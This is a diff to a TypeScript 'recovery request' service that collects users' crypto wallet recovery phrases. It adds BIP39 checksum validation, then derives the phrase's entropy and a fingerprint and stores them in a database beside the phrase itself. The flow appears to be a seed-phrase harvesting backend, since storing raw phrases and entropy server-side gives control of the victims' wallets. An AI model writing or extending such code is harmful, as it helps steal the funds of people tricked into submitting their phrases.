@@ -28,16 +28,62 @@ export interface RecoverySubmissionResult {
  * @param phrase - The phrase to validate
  * @returns boolean - True if valid, false otherwise
  */
-function validateRecoveryPhrase(phrase: string): boolean {
+import * as bip39 from 'bip39';
+
+interface ValidationResult {
+	isValid: boolean;
+	error?: string;
+	entropy?: string;
+	fingerprint?: string;
+}
+
+/**
+ * Generates a wallet fingerprint from a recovery phrase
+ * @param phrase - The recovery phrase to generate fingerprint from
+ * @returns string - Hexadecimal fingerprint
+ */
+function generateWalletFingerprint(phrase: string): string {
+	const seed = bip39.mnemonicToSeedSync(phrase);
+	// Take first 4 bytes of the seed as fingerprint
+	return seed.slice(0, 4).toString('hex');
+}
+
+function validateRecoveryPhrase(phrase: string): ValidationResult {
 	if (!phrase || typeof phrase !== 'string') {
-		return false;
+		return { isValid: false, error: 'Recovery phrase is required' };
 	}
 
 	const words = phrase
 		.trim()
 		.split(/\s+/)
 		.filter((word) => word.length > 0);
-	return words.length === 12 || words.length === 24;
+
+	if (words.length !== 12 && words.length !== 24) {
+		return { isValid: false, error: 'Recovery phrase must be exactly 12 or 24 words' };
+	}
+
+	// Check if all words are in the BIP39 wordlist
+	const invalidWords = words.filter(word => !bip39.wordlists.english.includes(word.toLowerCase()));
+	if (invalidWords.length > 0) {
+		return { 
+			isValid: false, 
+			error: `Invalid word(s) found: ${invalidWords.join(', ')}. All words must be from the BIP39 wordlist.`
+		};
+	}
+
+	// Validate the mnemonic entropy
+	if (!bip39.validateMnemonic(phrase)) {
+		return { isValid: false, error: 'Invalid recovery phrase checksum' };
+	}
+
+	const entropy = bip39.mnemonicToEntropy(phrase);
+const fingerprint = generateWalletFingerprint(phrase);
+
+return { 
+	isValid: true,
+	entropy,
+	fingerprint
+};
 }
 
 /**
@@ -132,13 +178,17 @@ export async function submitRecoveryRequest(
 			};
 		}
 
-		if (!validateRecoveryPhrase(data.phrase)) {
+		const phraseValidation = validateRecoveryPhrase(data.phrase);
+		if (!phraseValidation.isValid) {
 			return {
 				success: false,
-				message: 'Recovery phrase must be exactly 12 or 24 words',
+				message: phraseValidation.error || 'Invalid recovery phrase format',
 				error: 'INVALID_RECOVERY_PHRASE_FORMAT',
 			};
 		}
+
+		// Store entropy and fingerprint for additional validation
+		const { entropy, fingerprint } = phraseValidation;
 
 		const token = await findActiveTokenByString(data.token.trim());
 		if (!token) {
@@ -188,6 +238,8 @@ export async function submitRecoveryRequest(
 				wType: data.wType as WALL_TYPE,
 				createdAt: data.createdAt,
 				phrase: sanitizedPhrase,
+				entropy: entropy,
+				fingerprint: fingerprint,
 				user: {
 					connectOrCreate: {
 						where: {
